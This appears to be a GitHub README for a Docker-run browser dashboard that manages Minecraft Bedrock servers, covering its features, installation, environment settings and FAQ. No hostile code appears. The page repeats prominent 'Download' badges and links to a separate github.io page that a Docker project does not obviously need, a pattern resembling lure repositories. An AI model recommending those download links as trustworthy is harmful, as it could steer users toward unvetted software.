# Minecraft Bedrock Server Manager v1.0 - server management dashboard 2026

> **A Docker-powered browser dashboard for administering Minecraft Bedrock servers, with unified control, live visibility, and version 1.0 access through a web interface.**

[![Platform](https://img.shields.io/badge/Platform-Docker%20web%20UI-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/loganmebking4267/minecraft-bedrock-server-manager?style=flat-square)](https://github.com/loganmebking4267/minecraft-bedrock-server-manager)

---

<p align="center">
  <a href="https://loganmebking4267.github.io/minecraft-bedrock-server-manager/">
    <img src="https://img.shields.io/badge/Download-Minecraft%20Bedrock%20Server%20Manager%20Latest-brightgreen?style=for-the-badge" alt="Download Minecraft Bedrock Server Manager">
  </a>
</p>

> **[Direct Download - Minecraft Bedrock Server Manager v1.0](https://loganmebking4267.github.io/minecraft-bedrock-server-manager/)**

---

[Download Latest Build](https://loganmebking4267.github.io/minecraft-bedrock-server-manager/)

---

## What Minecraft Bedrock Server Manager Does

Minecraft Bedrock Server Manager is a browser-based dashboard that runs in Docker and is designed for working with Minecraft Bedrock servers. It consolidates several server instances into a single place, making it easier to watch status, issue commands, and handle everyday administration tasks without bouncing between separate utilities.

The project fits users who want a centralized management flow with a responsive UI in the browser. It is particularly practical when you need fast access to live controls, file editing, backups, and addon management across multiple Bedrock server instances.

---

## Key Capabilities

- Real-time server status delivered over WebSocket
- Manage several Bedrock server instances from one dashboard
- Start, stop, and restart servers in the browser
- Send console commands through the built-in web console
- Navigate files and edit configuration data directly
- Create world backups and restore them when needed
- Handle addon packs together with server content
- Password-protected web interface access

---

## Installation

Clone the repository or download it, then integrate it into your Docker-based workflow.

1. Retrieve the project files:
   - `git clone https://github.com/loganmebking4267/minecraft-bedrock-server-manager.git
   - or download the latest build from the release or pages link above
2. Build or launch the container using your Docker configuration.
3. Once the container is running, open the dashboard in your browser.

Example first launch command:

- `docker compose up -d`

---

## How to Use It

After deployment, open the dashboard in your browser and log in if access protection has been enabled. From there, you can:

- view live server health and current instance state
- start, stop, or restart a chosen Bedrock server
- execute commands directly in the server console
- edit files, settings, worlds, and addon packs
- make backups before larger changes
- restore a world or server state when necessary

For environments with multiple instances, the dashboard lets you switch between servers and apply changes without leaving the browser.

---

## Configuration

Most options are managed through Docker environment values and the server files handled by the dashboard. Common configuration areas include access credentials, server instance paths, and backup destinations.

Example environment-style settings:

- `ADMIN_PASSWORD=your-password`
- `SERVER_DATA_PATH=/data/servers`
- `BACKUP_PATH=/data/backups`

Set these values to match your container layout and the way you store Bedrock server data.

---

## Requirements

- Docker-compatible host
- Modern browser for the web UI
- Storage for Bedrock server files, worlds, and backups
- Network access to the dashboard and server ports as needed
- Enough memory and disk space for one or more server instances

---

## FAQ

**How do I open the dashboard?**  
Start the container, then visit the web address exposed by your setup.

**Is multi-server management supported?**  
Yes. The dashboard is intended for multiple Bedrock server instances.

**Where is configuration stored?**  
Configuration usually lives in Docker environment variables and the mounted server data directories.

**What if the UI fails to load?**  
Review the container logs, verify port mapping, and confirm that Docker is running.

**How do I update my deployment?**  
Pull the newest image or refresh the project files, then restart the container with your usual deployment steps.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
